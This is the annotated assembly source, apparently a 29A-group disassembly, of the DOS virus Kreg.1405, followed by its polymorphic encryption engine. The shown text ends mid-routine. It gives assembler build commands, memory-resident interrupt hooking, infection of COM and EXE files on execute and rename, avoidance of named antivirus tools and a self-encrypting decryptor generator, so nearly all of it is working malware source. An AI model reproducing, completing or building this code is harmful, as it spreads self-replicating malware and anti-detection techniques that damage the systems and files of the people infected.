comment *
			       Kreg.1405	       ЬЫЫЫЫЫЬ ЬЫЫЫЫЫЬ ЬЫЫЫЫЫЬ
			     Disassembly by	       ЫЫЫ ЫЫЫ ЫЫЫ ЫЫЫ ЫЫЫ ЫЫЫ
			      Darkman/29A		ЬЬЬЫЫЯ ЯЫЫЫЫЫЫ ЫЫЫЫЫЫЫ
						       ЫЫЫЬЬЬЬ ЬЬЬЬЫЫЫ ЫЫЫ ЫЫЫ
						       ЫЫЫЫЫЫЫ ЫЫЫЫЫЫЯ ЫЫЫ ЫЫЫ

  Kreg.1405 is a 1405 bytes resident appending COM and EXE virus. Infects
  files at load and execute program and rename file. Kreg.1405 has en error
  handler, anti-heuristics, retro structures and is polymorphic in file using
  its internal polymorphic engine.

  To compile Kreg.1405 with Turbo Assembler v 5.0 type:
    TASM /M KREG1405.ASM
    TLINK /x KREG1405.OBJ
    EXE2BIN KREG1405.EXE KREG1405.COM
*

.model tiny
.code
.186

code_begin:
	     call    delta_offset
delta_offset:
	     pop     si 		 ; Load SI from stack
	     sub     si,(delta_offset-code_begin)

	     mov     ah,62h		 ; Get current PSP address
	     int     21h
	     mov     ds,bx		 ; DS = segment of PSP for current ...
	     mov     es,bx		 ; ES = segment of PSP for current ...

	     mov     ax,0aaaah		 ; Kreg.1405 function
	     int     21h
	     cmp     ax,0deadh		 ; Already resident?
	     je      virus_exit 	 ; Equal? Jump to virus_exit

	     pusha			 ; Save all registers at stack
	     push    ds es		 ; Save segments at stack
	     mov     ax,es		 ; AX = segment of PSP for current ...
	     dec     ax 		 ; AX = segment of current Memory C...
	     mov     es,ax		 ; ES =    "    "     "      "     "

	     mov     bx,03h		 ; BX = offset of size of memory bl...
	     sub     word ptr es:[bx],(data_end-code_begin+0fh)/10h

	     dec     bx 		 ; BX = offset of segment of first ...
	     mov     ax,[bx]		 ; AX = segment of first byte beyon...
	     sub     ax,(data_end-code_begin+0fh)/10h
	     mov     [bx],ax		 ; Store segment of first byte beyo...

	     mov     es,ax		 ; ES = segment of virus

	     push    cs 		 ; Save CS at stack
	     pop     ds 		 ; Load DS from stack (CS)

	     xor     di,di		 ; Zero DI
	     mov     cx,(code_end-code_begin)
	     rep     movsb		 ; Move virus to memory

	     push    es 		 ; Save ES at stack
	     pop     ds 		 ; Load DS from stack (ES)

	     mov     ax,3510h		 ; Get interrupt vector 10h
	     int     21h
	     mov     word ptr [int10_addr],bx
	     mov     word ptr [int10_addr+02h],es

	     mov     ax,2510h		 ; Set interrupt vector 10h
	     lea     dx,int10_virus	 ; DX = offset of int10_virus
	     int     21h

	     mov     ax,3521h		 ; Get interrupt vector 10h
	     int     21h
	     mov     word ptr [int21_addr],bx
	     mov     word ptr [int21_addr+02h],es

	     xor     ax,ax		 ; Zero AX
	     mov     es,ax		 ; ES = BIOS data area

	     lea     si,int21_virus	 ; SI = offset of int21_virus
	     mov     di,4d0h		 ; DI = offset of reserved memory i...
	     push    di 		 ; Save DI at stack
	     mov     cx,(int21_end-int21_begin)
	     rep     movsb		 ; Move interrupt 21h handler to BI...
	     mov     ds,ax		 ; DS = BIOS data area
	     pop     dx 		 ; Load DX from stack (DI)

	     mov     ax,2521h		 ; Set interrupt vector 21h
	     int     21h
	     pop     es ds		 ; Load segments from stack
	     popa			 ; Load all registers from stack
virus_exit:
	     add     si,offset file_header
	     cmp     cs:[si],'ZM'        ; EXE executable?
	     je      vir_exe_exit	 ; Equal? Jump to vir_exe_exit

	     mov     di,100h		 ; DI = offset of beginning of code
	     push    di 		 ; Save DI at stack
	     mov     cx,18h		 ; Move twenty-four bytes
	     rep     movsb		 ; Move the original code to beginning

	     xor     ax,ax		 ; Zero AX

	     ret			 ; Return
vir_exe_exit:
	     mov     cx,ds		 ; CX = segment of PSP for current ...
	     add     cx,10h		 ; CX = segment of beginning of code

	     mov     dx,cx		 ; DX = segment of beginning of code
	     add     dx,cs:[si+0eh]	 ; Add initial SS relative to start...

	     cli			 ; Clear interrupt-enable flag
	     mov     ss,dx		 ; SS = initial SS relative to star...
	     mov     sp,cs:[si+10h]	 ; SP = initial SP
	     sti			 ; Set interrupt-enable flag

	     add     cx,cs:[si+16h]	 ; CX = initial CS relative to star...
	     push    cx 		 ; Save CX at stack

	     push    cs:[si+14h]	 ; Save initial IP at stack

	     xor     ax,ax		 ; Save AX at stack

	     retf			 ; Return far

int21_call   proc    near		 ; Call interrupt 21h
	     push    bx 		 ; Save BX at stack
	     mov     bl,al		 ; BL = function number
	     mov     bh,00h		 ; Zero BH
	     shl     bx,01h		 ; Multply function number with two

	     mov     ax,cs:[bx+function_tbl]
	     pop     bx 		 ; Load BX from stack
	     int     21h

	     ret			 ; Return
	     endp

int21_begin:
int21_virus  proc    near		 ; Interrupt 21h of Kreg.1405
	     cmp     ax,0aaaah		 ; Kreg.1405 function?
	     jne     not_kreg_fun	 ; Not equal? Jump to not_kreg_fun

	     mov     ax,0deadh		 ; Already resident

	     iret			 ; Interrupt return
not_kreg_fun:
	     pusha			 ; Save all registers at stack
	     push    ds es		 ; Save segments at stack

	     sub     ah,30h		 ; Subtract thirty from function nu...
	     cmp     ax,(4b00h-3000h)	 ; Load and execute program?
	     je      infect_file	 ; Equal? Jump to infect_file
	     cmp     ah,(56h-30h)	 ; Rename file?
	     jne     int21_exit 	 ; Not equal? Jump to int21_exit
infect_file:
	     mov     ax,0deadh		 ; Kreg.1405 function
	     int     10h
int21_exit:
	     pop     es ds		 ; Load segments from stack
	     popa			 ; Load all registers from stack
	     cli			 ; Clear interrupt-enable flag

	     db      11101010b		 ; JMP imm32 (opcode 0eah)
int21_addr   dd      ?			 ; Address of interrupt 21h
	     endp
int21_end:

int10_virus  proc    near		 ; Interrupt 10h of Kreg.1405
	     cmp     ax,0deadh		 ; Kreg.1405 function?
	     jne     int10_exit_	 ; Not equal? Jump to int10_exit_

	     call    exam_name
	     jc      int10_exit 	 ; Error? Jump to int10_exit

	     call    infect_file_
int10_exit:
	     iret			 ; Interrupt return
int10_exit_:
	     db      11101010b		 ; JMP imm32 (opcode 0eah)
int10_addr   dd      ?			 ; Address of interrupt 10h
	     endp

exam_name    proc    near		 ; Examine filename
	     mov     si,dx		 ; SI = offset of filename
find_dot:
	     lodsb			 ; AL = one byte of filename
	     cmp     al,00h		 ; End of filename?
	     je      examine_exit	 ; Equal? Jump to examine_exit
	     cmp     al,'.'              ; Dot?
	     jne     find_dot		 ; Not equal? Jump to find_dot

	     mov     ax,[si-04h]	 ; AX = two bytes of filename
	     and     ax,1101111111011111b
	     cmp     ax,'NA'             ; COMMAND.COM
	     je      examine_exit	 ; Equal? Jump to examine_exit
	     cmp     ax,'SE'             ; Aidstest?
	     je      examine_exit	 ; Equal? Jump to examine_exit
	     cmp     ax,'EW'             ; Dr. Web?
	     je      examine_exit	 ; Equal? Jump to examine_exit
	     cmp     ax,'NI'             ; ADinf?
	     je      examine_exit	 ; Equal? Jump to examine_exit

	     lodsw			 ; AX = two bytes of file extension
	     and     ax,1101111111011111b
	     cmp     ax,'OC'             ; COM executable?
	     jne     exam_exe_ext	 ; Not equal? Jump to exam_exe_ext

	     lodsb			 ; AL = one byte of file extension
	     and     al,11011111b	 ; Upcase character
	     cmp     al,'M'              ; COM executable?
	     jne     examine_exit	 ; Not equal? Jump to examine_exit

	     clc			 ; Clear carry flag

	     ret			 ; Return
exam_exe_ext:
	     cmp     ax,'XE'             ; EXE executable?
	     jne     examine_exit	 ; Not equal? Jump to examine_exit

	     lodsb			 ; AL = one byte of file extension
	     and     al,11011111b	 ; Upcase character
	     cmp     al,'E'              ; EXE executable?
	     jne     examine_exit	 ; Not equal? Jump to examine_exit

	     clc			 ; Clear carry flag

	     ret			 ; Return
examine_exit:
	     stc			 ; Set carry flag

	     ret			 ; Return
	     endp

infect_file_ proc    near		 ; Infect COM or EXE file
	     push    dx ds		 ; Save registers at stack
	     mov     al,00h		 ; Get interrupt vector 24h
	     call    int21_call
	     mov     word ptr cs:[int24_addr],bx
	     mov     word ptr cs:[int24_addr+02h],es

	     mov     al,01h		 ; Set interrupt vector 24h

	     push    cs 		 ; Save CS at stack
	     pop     ds 		 ; Load DS from stack (CS)

	     lea     dx,int24_virus	 ; DX = offset of int24_virus
	     call    int21_call
	     pop     ds dx		 ; Load registers from stack

	     push    dx ds		 ; Save registers at stack
	     mov     al,02h		 ; Get file attributes
	     call    int21_call
	     mov     cs:[file_attr],cx	 ; Store file attributes
	     jc      infect_exit	 ; Error? Jump to infect_exit

	     mov     al,03h		 ; Set file attributes
	     xor     cx,cx		 ; CX = new files attributes
	     call    int21_call
	     jc      infect_exit	 ; Error? Jump to infect_exit

	     mov     al,04h		 ; Open file (read/write)
	     call    int21_call
	     mov     bx,ax		 ; BX = file handle
	     jnc     get_file_inf	 ; No error? Jump to get_file_inf
infect_exit:
	     jmp     infect_exit_
get_file_inf:
	     mov     al,05h		 ; Get file's date and time

	     push    cs 		 ; Save CS at stack
	     pop     ds 		 ; Load DS from stack (CS)

	     call    int21_call
	     mov     [file_time],cx	 ; Store file's time
	     mov     [file_date],dx	 ; Store file's date
	     jc      set_file_inf	 ; Error? Jump to set_file_inf

	     mov     al,06h		 ; Read from file
	     mov     cx,18h		 ; Read twenty-four bytes
	     lea     dx,file_header	 ; DX = offset of file_header
	     call    int21_call
	     jc      set_file_inf	 ; Error? Jump to set_file_inf

	     mov     al,07h		 ; Set current file position (EOF)
	     xor     cx,cx		 ; CX:DX = offset from origin of ne...
	     xor     dx,dx		 ;   "   "   "     "     "    "    "
	     call    int21_call
	     jc      set_file_inf	 ; Error? Jump to set_file_inf

	     cmp     word ptr [file_header+12h],0deadh
	     je      set_file_inf	 ; Already infected? Jump to set_fi...
	     cmp     word ptr [file_header],'ZM'
	     je      infect_exe 	 ; EXE executable? Jump to infect_exe

	     cmp     dx,00h		 ; Filesize too large?
	     jne     set_file_inf	 ; Not equal? Jump to set_file_inf
	     cmp     ax,0ffffh-(code_end-code_begin)-200h
	     jae     set_file_inf	 ; Filesize too large? Jump set_fil...

	     jmp     infect_com
set_file_inf:
	     jmp     set_file_in
infect_exe:
	     push    ax dx		 ; Save registers at stack
	     mov     cx,200h		 ; Divide by pages
	     div     cx 		 ; AX:DX = filesize in pages

	     or      dx,dx		 ; No bytes in last 512-bytes page ...
	     je      dont_inc_pag	 ; Equal? Jump to dont_inc_pag

	     inc     ax 		 ; Increase total number of 512-byt...
dont_inc_pag:
	     cmp     word ptr [file_header+04h],ax
	     jne     test_overlay	 ; Internal overlay? Jump to test_o...
	     cmp     word ptr [file_header+02h],dx
test_overlay:
	     pop     dx ax		 ; Load registers from stack

	     jne     set_file_inf	 ; Internal overlay? Jump to set_in...
infect_com:
	     push    ax dx		 ; Save registers at stack
	     push    cs 		 ; Save CS at stack
	     pop     es 		 ; Load ES from stack (CS)

	     mov     dx,(decryp_end-decryp_begin)
	     lea     si,encryptor	 ; SI = offset of encryptor
	     lea     di,decryptor	 ; SI = offset of decryptor
	     call    kreg_poly

	     lea     si,code_begin	 ; SI = offset of code_begin
	     lea     di,buffer		 ; DI = offset of buffer
	     push    bx cx		 ; Save registers at stack
	     mov     cx,(code_end-code_begin)
	     mov     [encrypt_len],cx	 ; Store length of encrypted code
	     call    encryptor
	     pop     cx bx		 ; Load registers from stack

	     mov     ax,cx		 ; AX = length of decryptor
	     add     ax,(code_end-code_begin)
	     mov     [virus_length],ax	 ; Store length of virus

	     mov     al,08h		 ; Write to file
	     lea     dx,decryptor	 ; DX = offset of decryptor
	     call    int21_call
	     jc      set_file_in_	 ; Error? Jump to set_file_in_

	     mov     al,08h		 ; Write to file
	     mov     cx,(code_end-code_begin)
	     lea     dx,buffer		 ; DX = offset of buffer
	     call    int21_call
set_file_in_:
	     pop     dx ax		 ; Load registers from stack
	     jc      set_file_in	 ; Error? Jump to set_file_in

	     cmp     word ptr [file_header],'ZM'
	     je      infect_exe_	 ; Equal? Jump to infect_exe

	     sub     ax,03h		 ; AX = offset of virus within infe...
	     mov     [file_header],11101001b
	     mov     [virus_offset],ax	 ; Store offset of virus within inf...

	     jmp     write_header
infect_exe_:
	     push    ax dx		 ; Save registers at stack
	     add     ax,[virus_length]	 ; Add length of virus to filesize
	     adc     dx,00h		 ;  "    "    "    "   "     "

	     mov     cx,200h		 ; Divide by pages
	     div     cx 		 ; DX:AX = filesize in pages
	     inc     ax 		 ; Increase total number of 512-byt...

	     mov     word ptr [file_header+04h],ax
	     mov     word ptr [file_header+02h],dx
	     pop     dx ax		 ; Load registers from stack

	     mov     si,word ptr [file_header+08h]
	     mov     cl,04h		 ; Multiply by paragraphs
	     shl     si,cl		 ; SI = headersize

	     sub     ax,si		 ; Subtract headersize from filesize
	     sbb     dx,00h		 ;    "         "       "      "
	     mov     cx,10h		 ; Divide by paragraphs
	     div     cx 		 ; DX:AX = filesize in paragraphs

	     mov     word ptr [file_header+16h],ax
	     mov     word ptr [file_header+14h],dx
	     mov     word ptr [file_header+0eh],ax
	     mov     word ptr [file_header+10h],1000h
write_header:
	     mov     word ptr [file_header+12h],0deadh

	     mov     al,09h		 ; Set current file position (SOF)
	     xor     cx,cx		 ; CX:DX = offset from origin of ne...
	     xor     dx,dx		 ;   "   "   "     "     "    "    "
	     call    int21_call
	     jc      set_file_in	 ; Error? Jump to set_file_in

	     mov     al,08h		 ; Write to file
	     mov     cx,18h		 ; Read twenty-four bytes
	     lea     dx,file_header	 ; DX = offset of file_header
	     call    int21_call
set_file_in:
	     mov     al,0ah		 ; Set file's date and time
	     mov     cx,[file_time]	 ; CX = new time
	     mov     dx,[file_date]	 ; DX = new date
	     call    int21_call

	     mov     al,0bh		 ; Close file
	     call    int21_call
infect_exit_:
	     mov     cx,[file_attr]	 ; CX = new file attributes
	     pop     ds dx		 ; Load registers from stack
	     mov     ax,03h		 ; Set file attributes
	     call    int21_call

	     mov     ax,01h		 ; Set interrupt vector 24h
	     mov     dx,word ptr cs:[int24_addr+02h]
	     mov     ds,dx		 ; DS = segment of interrupt
	     mov     dx,word ptr cs:[int24_addr]
	     call    int21_call

	     ret			 ; Return
	     endp

int24_virus  proc    near		 ; Interrupt 24h of Kreg.1405
	     mov     al,03h		 ; AL = fail system call in progress

	     iret			 ; Interrupt return!
	     endp

virus_offset equ     word ptr $+01h	 ; Offset of virus within infected ...
file_header  db      18h dup(?) 	 ; File header
function_tbl dw      3524h		 ; Get interrupt vector 24h
	     dw      2524h		 ; Set interrupt vector 24h
	     dw      4300h		 ; Get file attributes
	     dw      4301h		 ; Set file attributes
	     dw      3d02h		 ; Open file (read/write)
	     dw      5700h		 ; Get file's date and time
	     dw      3f00h		 ; Read from file
	     dw      4202h		 ; Set current file position (EOF)
	     dw      4000h		 ; Write to file
	     dw      4200h		 ; Set current file position (SOF)
	     dw      5701h		 ; Set file's date and time
	     dw      3e00h		 ; Close file
	     db      '[ Gremlin 1.04 / AVL ]'
file_attr    dw      ?			 ; File attributes
file_time    dw      ?			 ; File's time
file_date    dw      ?			 ; File's date
int24_addr   dd      ?			 ; Address of interrupt 24h
virus_length dw      ?			 ; Length of virus

; The below text is in russian and can be translated as following:
; [As you see mr. Daniloff, fooling your heuristic scanner is very easy...]
	     db      '[ Љ Є ўЁ¤ЁвҐ, Ј-­ „ ­Ё«®ў, ®Ў¬ ­гвм ‚ и нўаЁбвЁзҐбЄЁ©  ­ «Ё§ в®а ­Ґ в Є г¦ Ё ваг¤­®... ]'

comment *
		     Kreg.1405 (polymorphic engine)    ЬЫЫЫЫЫЬ ЬЫЫЫЫЫЬ ЬЫЫЫЫЫЬ
			     Disassembly by	       ЫЫЫ ЫЫЫ ЫЫЫ ЫЫЫ ЫЫЫ ЫЫЫ
			      Darkman/29A		ЬЬЬЫЫЯ ЯЫЫЫЫЫЫ ЫЫЫЫЫЫЫ
						       ЫЫЫЬЬЬЬ ЬЬЬЬЫЫЫ ЫЫЫ ЫЫЫ
						       ЫЫЫЫЫЫЫ ЫЫЫЫЫЫЯ ЫЫЫ ЫЫЫ

		 Calling parameters:
		   DX	  Maximum length of decryptor
		   DI	  Offset of decryptor
		   SI	  Offset of encryptor

		 Return parameters:
		   CX	  Length of decryptor

  Index registers:
    BX; DI; SI

  Count registers:
    AX; BX; CX; DX; DI; SI; BP

  Registers holding two byts of encrypted code:
    AX; BX; CX; DX; DI; SI; BP

  Decryptor:
    CALL imm16
    POP reg16
    ADD reg16,imm16				    (Offset of encrypted code)
    MOV reg16,imm16				    (Length of encrypted code)
    (PUSH CS)
    (POP DS); (POP ES)
    MOV reg16,(CS:); (DS:); (ES:); [reg16]
      XOR reg16,imm16
      ADD reg16,imm16
      SUB reg16,imm16
      NOT reg16
      NEG reg16
      ROL reg16,imm8
      ROR reg16,imm8
      NOP; INC reg16
      ...
    MOV (CS:); (DS:); (ES:); [reg16],reg16
    INC reg16					     (Increase index register)
    INC reg16					     (	 "       "      "    )
    DEC reg16					     (Decrease count register)
    JZ imm8					    (Offset of encrypted code)
    DEC reg16					     (Decrease count register)
    JZ imm8					    (Offset of encrypted code)
    JMP imm16		    (Offset of MOV reg16,(CS:); (DS:); (ES:); [reg16])

  Minimum length of decryptor:		    User defined - 03h.
  Maximum length of decryptor:		    User defined.
  Length of Kreg.1405 (polymorphic engine): 523 bytes.
*

idx_reg_num  db      ?			 ; Index register number
idx_reg_num_ db      ?			 ; Index register number
seg_override db      ?			 ; Segment override
coun_reg_num db      ?			 ; Count register number
code_reg_num db      ?			 ; Register holding two bytes of en...
decrypt_len  equ     word ptr $ 	 ; Length of decryptor
mov_r16__off dw      ?			 ; Offset of MOV reg16,(CS:;DS:;ES:...
call_imm16   db      11101000b,00h,00h	 ; CALL imm16 (opcode 0e8h,00h,00h)
pop_reg16    db      01011000b		 ; POP reg16 (opcode 58h)
add_r16_i16  db      10000001b,11000000b ; ADD reg16,imm16 (opcode 81h,0c0...)
	     db      00h,00h		 ;  "       "         "         "
mov_r16_i16  db      10111000b,00h,00h	 ; MOV reg16,imm16 (opcode 0b8h,00...)
idx_reg_tbl  db      00000011b		 ; Base register (BX)
	     db      00000110b		 ; Source index (SI)
	     db      00000111b		 ; Destination index (DI)
idx_reg_tbl_ db      00000111b		 ; Base register (BX)
	     db      00000100b		 ; Source index (SI)
	     db      00000101b		 ; Destination index (DI)
seg_over_tbl:
	     segcs			 ; Code segment as source segment
	     segds			 ; Data segment as source segment
	     seges			 ; Extra segment as source segment
table_begin:
cryptor_tbl:
	     db      02h		 ; 16-bit immediate
	     db      10000001b,11110000b ; XOR reg16,imm16
	     db      10000001b,11110000b ;  "       "
	     db      02h		 ; 16-bit immediate
	     db      10000001b,11000000b ; ADD reg16,imm16
	     db      10000001b,11101000b ; SUB reg16,imm16
	     db      02h		 ; 16-bit immediate
	     db      10000001b,11101000b ; SUB reg16,imm16
	     db      10000001b,11000000b ; ADD reg16,imm16
	     db      00h		 ; No immediate
	     db      11110111b,11010000b ; NOT reg16
	     db      11110111b,11010000b ;  "    "
	     db      00h		 ; No immediate
	     db      11110111b,11011000b ; NEG reg16
	     db      11110111b,11011000b ;  "    "
	     db      01h		 ; 8-bit immediate
	     db      11000001b,11000000b ; ROL reg16,imm8
	     db      11000001b,11001000b ; ROR reg16,imm8
	     db      01h		 ; 8-bit immediate
	     db      11000001b,11001000b ; ROR reg16,imm8
	     db      11000001b,11000000b ; ROL reg16,imm8
	     db      00h		 ; No immediate
	     db      10010000b,01000000b ; NOP; INC reg16
	     db      10010000b,01001000b ; NOP; DEC reg16
	     db      00h		 ; No immediate
	     db      10010000b,01000000b ; NOP; INC reg16
	     db      10010000b,01001000b ; NOP; DEC reg16
table_end:

kreg_poly    proc    near		 ; KREG.1405 (polymorphic engine)
	     pusha			 ; Save all registers at stack
	     push    ds es		 ; Save segments at stack
	     push    ds 		 ; Save DS at stack
	     pop     es 		 ; Load ES from stack (DS)

	     push    di 		 ; Save DI at stack
	     mov     di,si		 ; DI = offset of encryptor
	     mov     al,10010000b	 ; NOP (opcode 90h)
	     mov     cx,dx		 ; CX = maximum length of decryptor
	     rep     stosb		 ; Store NOPs
	     pop     di 		 ; Load DI from stack

	     push    si 		 ; Save SI at stack
	     mov     bp,di		 ; BP = offset of decryptor
	     call    init_random
	     call    init_poly

	     push    si 		 ; Save SI at stack
	     lea     si,call_imm16	 ; SI = offset of call_imm16
	     movsw			 ; Move CALL imm16 to decryptor buffer
	     movsb			 ;  "    "     "   "      "       "

	     lodsb			 ; AL = one byte of pop_reg16
	     add     al,[idx_reg_num]	 ; Add index register number to POP...
	     stosb			 ; Store POP reg16

	     lodsw			 ; AX = two bytes of add_r16_i16
	     add     ah,[idx_reg_num]	 ; Add index register number to ADD...
	     stosw			 ; Store ADD reg16,imm16
	     movsw			 ; Move 16-bit immediate


	     lodsw			 ; AX = two bytes of mov_r16_i16
	     add     al,[coun_reg_num]	 ; Add count register number to MOV...
	     stosw			 ; Store MOV reg16,imm16
	     movsb			 ; Move low-order byte of 16-bit im...
	     pop     si 		 ; Load SI from stack

	     sub     dx,0bh		 ; Subtract eleven from maximum len...
	     mov     ah,[seg_override]	 ; AH = segment override
	     cmp     ah,00101110b	 ; CS: (opcode 2eh)
	     je      sto_mov_r16_	 ; Equal? Jump to sto_mov_r16_

	     mov     al,00001110b	 ; PUSH CS (opcode 0eh)
	     cmp     ah,00111110b	 ; DS: (opcode 3eh)
	     jne     pop_es		 ; Not equal? Jump to pop_es

	     mov     ah,00011111b	 ; POP DS (opcode 1fh)

	     jmp     sto_push_pop
pop_es:
	     mov     ah,00000111b	 ; POP ES (opcode 07h)
sto_push_pop:
	     stosw			 ; Store PUSH CS; POP reg16

	     dec     dx 		 ; Decrease maximum length of decry...
	     dec     dx 		 ;    "        "      "    "     "
sto_mov_r16_:
	     mov     [mov_r16__off],di	 ; Store offset of MOV reg16,(CS:;D...

	     mov     ax,dx		 ; AX = maximum length of decryptor
	     sub     ax,0eh		 ; Subtract fourteen from maximum l...
	     shr     ax,01h		 ; Divide maximum length of decrypt...
	     mov     dx,ax		 ; DX = maximum length of decryptor...
	     call    rnd_in_range
	     add     dx,ax		 ; Add random number within range t...

	     mov     ah,10001011b	 ; MOV reg16,[reg16] (opcode 8bh)
	     mov     al,[seg_override]	 ; AL = segment override
	     stosw			 ; Store MOV reg16,(CS:;DS:;ES:)[re...

	     mov     al,[idx_reg_num_]	 ; AL = index register number
	     mov     ah,[code_reg_num]	 ; AH = register holding two bytes ...
	     shl     ah,03h		 ; AH =    "        "     "    "    "
	     add     al,ah		 ; Add register holding two bytes o...
	     stosb			 ; Store MOV reg16,(CS:;DS:;ES:)[re...
	     sub     dx,03h		 ; Subtract three from maximum leng...

	     mov     al,10101101b	 ; LODSW (opcode 0adh)
	     mov     [si],al		 ; Store LODSW

	     add     si,dx		 ; Add maximum length of decryptor ...
	     inc     si 		 ; Increase maximum length of decry...
	     push    si 		 ; Save SI at stack

	     xor     ch,ch		 ; Zero CH
gen_cryptor:
	     mov     ax,(table_end-table_begin)/05h
	     call    rnd_in_range

	     lea     bx,cryptor_tbl	 ; BX = offset of cryptor_tbl
	     add     bx,ax		 ; Add random number within nine to...
	     shl     ax,02		 ; Multiply random numbe within nin...
	     add     bx,ax		 ; Add random number within nine to...

	     mov     cl,[bx]		 ; CL = length of immediate
	     inc     cx 		 ; CX = length of cryptor instruction
	     inc     cx 		 ; CX =   "    "     "         "
	     cmp     cx,dx		 ; End of decryptor?
	     ja      sto_mov_r16	 ; Above? Jump to sto_mov_r16

	     sub     si,cx		 ; Add length of cryptor instructio...

	     mov     ax,[bx+01h]	 ; AX = decryption instruction
	     add     ah,[code_reg_num]	 ; Add register holding two bytes o...
	     stosw			 ; Store decryption instruction

	     mov     ax,[bx+03h]	 ; AX = encryption instruction
	     mov     [si],ax		 ; Store encryption instruction

	     inc     si 		 ; Increase offset within encryptor
	     inc     si 		 ;    "       "      "        "
	     dec     dx 		 ; Decrease maximum length of decry...
	     dec     dx 		 ;    "        "      "    "     "

	     mov     bl,cl		 ; BL = length of cryptor instruction
	     sub     bl,02h		 ; BL = length of immediate
sto_imm_loop:
	     jz      dont_sto_imm	 ; Zero? Jump to dont_sto_imm

	     call    rnd_in_range
	     stosb			 ; Store immediate
	     mov     [si],al		 ;   "       "

	     inc     si 		 ; Increase offset within encryptor
	     dec     dx 		 ; Decrease maximum length of decry...
	     dec     bl 		 ; Decrease length of immediate

	     jmp     sto_imm_loop
dont_sto_imm:
	     sub     si,cx		 ; Subtract length of cryptor instr...

	     jmp     gen_cryptor
sto_mov_r16:
	     mov     ah,10001001b	 ; MOV [reg16],reg16 (opcode 89h)
	     mov     al,[seg_override]	 ; AL = segment override
	     stosw			 ; Store MOV (CS:;DS:;ES:)[reg16],r...

	     mov     al,[idx_reg_num_]	 ; AL = index register number
	     mov     ah,[code_reg_num]	 ; AH = register holding two bytes ...
	     shl     ah,03h		 ; AH =    "        "     "    "    "
	     add     al,ah		 ; Add register holding two bytes o...
	     stosb			 ; Store MOV (CS:;DS:;ES:)[reg16],r...
	     pop     si 		 ; Load SI from stack

	     mov     al,01000000b	 ; INC reg16 (opcode 40h)
	     add     al,[idx_reg_num]	 ; Add index register number to POP...
	     mov     ah,al		 ; INC reg16; INC reg16
	     stosw			 ; Store INC reg16; INC reg16

	     mov     al,01001000b	 ; DEC reg16 (opcode 48h)
	     add     al,[coun_reg_num]	 ; Add count register number to DEC...
	     stosb			 ; Store DEC reg16

	     push    ax 		 ; Save AX at stack
	     mov     ax,0000011001110100b
	     stosw			 ; Store JZ $+06h
	     pop     ax 		 ; Load AX from stack
	     stosb			 ; Store DEC reg16
	     mov     ax,0000001101110100b
	     stosw			 ; Store JZ $+03h

	     mov     al,11101001b	 ; JMP imm16 (opcode 0e9h)
	     stosb			 ; Store JMP imm16

	     mov     ax,[mov_r16__off]	 ; AX = offset of MOV reg16,(CS:;DS...
	     sub     ax,di		 ; Subtract offset encrypted code f...
	     dec     ax 		 ; Decrease 16-bit immediate
	     dec     ax 		 ;    "       "        "
	     stosw			 ; Store 16-bit immediate

	     xchg    si,di		 ; DI = offset within encryptor
	     mov     ax,0100100110101011b
	     stosw			 ; Store STOSW; DEC CX
	     mov     ax,0000011001110100b
	     stosw			 ; Store JZ $+06h
	     mov     ax,0111010001001001b
	     stosw			 ; Store DEC CX; JZ imm8
	     mov     ax,1110100100000011b
	     stosw			 ; Store 8-bit immediate; JMP imm16
	     pop     ax 		 ; Load AX from stack

	     dec     ax 		 ; Decrease 16-bit immediate
	     dec     ax 		 ;    "       "        "
	     sub     ax,di		 ; Subtract offset plain code from ...
	     stosw			 ; Store 16-bit immediate

	     mov     al,11000011b	 ; RET (opcode 0c3h)
	     stosb			 ; Store RET

	     sub     si,bp		 ; Subtract offset of decryptor fro...
	     mov     [decrypt_len],si	 ; Store length of decryptor

	     sub     si,03h		 ; Subtract three from length of de...
	     mov     ds:[bp+06h],si	 ; Store offset of encrypted code
	     pop     es ds		 ; Load segments from stack
	     popa			 ; Load all registers from stack

	     mov     cx,[decrypt_len]	 ; CX = length of decryptor

	     ret			 ; Return
	     endp

init_random  proc    near		 ; Initialize random number generator
	     push    ax es		 ; Save registers at stack
	     xor     ax,ax		 ; Zero AX
	     mov     es,ax		 ; ES = BIOS data area
	     mov     ax,es:[46ch]	 ; AX = low-order word of timer tic...
	     mov     [random_num],ax	 ; Store 16-bit random number
	     pop     es ax		 ; Load registers from stack

	     ret			 ; Return
	     endp

init_poly    proc    near		 ; Initialize KREG.1405 (polymorph...)
	     push    ax bx		 ; Save registers at stack
	     mov     ax,03h		 ; Get random number withn three
	     call    rnd_in_range
	     mov     bx,ax		 ; BX = random number within three

	     mov     al,[bx+idx_reg_tbl] ; AL = index register number
	     mov     [idx_reg_num],al	 ; Store index register number
	     mov     al,[bx+idx_reg_tbl_]
	     mov     [idx_reg_num_],al	 ; Store index register number

	     mov     ax,03h		 ; Get random number withn three
	     call    rnd_in_range
	     mov     bx,ax		 ; BX = random number within three

	     mov     al,byte ptr [bx+seg_over_tbl]
	     mov     [seg_override],al	 ; Store segment override
get_code_reg:
	     call    get_rnd_num
	     and     al,00000111b	 ; AL = random number within seven

	     cmp     al,[idx_reg_num]	 ; Register holding two bytes of e...?
	     je      get_code_reg	 ; Equal? Jump to get_code_reg
	     cmp     al,00000100b	 ; Stack pointer (SP)?
	     je      get_code_reg	 ; Equal? Jump to get_code_reg

	     mov     [code_reg_num],al	 ; Store register holding two bytes...
get_coun_reg:
	     call    get_rnd_num
	     and     al,00000111b	 ; AL = random number within seven

	     cmp     al,[idx_reg_num]	 ; Count register equal to index r...?
	     je      get_coun_reg	 ; Equal? Jump to get_coun_reg
	     cmp     al,00000100b	 ; Stack pointer (SP)?
	     je      get_coun_reg	 ; Equal? Jump to get_coun_reg
	     cmp     al,[code_reg_num]	 ; Count register equal to registe...?
	     je      get_coun_reg	 ; Equal? Jump to get_coun_reg

	     mov     [coun_reg_num],al	 ; Store count register number
	     pop     bx ax		 ; Load registers from stack

	     ret			 ; Return
	     endp

rnd_in_range proc    near		 ; Random number within range
	     push    dx 		 ; Save DX at stack
	     mov     dx,ax		 ; DX = number within
	     call    get_rnd_num

	     mul     dx 		 ; DX = random number within range
	     mov     ax,dx		 ; AX =   "      "      "      "
	     pop     dx 		 ; Load DX from stack

	     ret			 ; Return
	     endp

get_rnd_num  proc    near		 ; Get 16-bit random number
random_num   equ     word ptr $+01h	 ; 16-bit random number
	     mov     ax,00h		 ; AX = 16-bit random number
	     push    bx dx		 ; Save registers at stack
	     mov     bx,4e51h		 ; Multiply with twenty thousand an...
	     mul     bx 		 ; AX = 16-bit random number
	     pop     dx bx		 ; Load registers from stack

	     add     ax,15bh		 ; Add three hundred and fourty-sev...
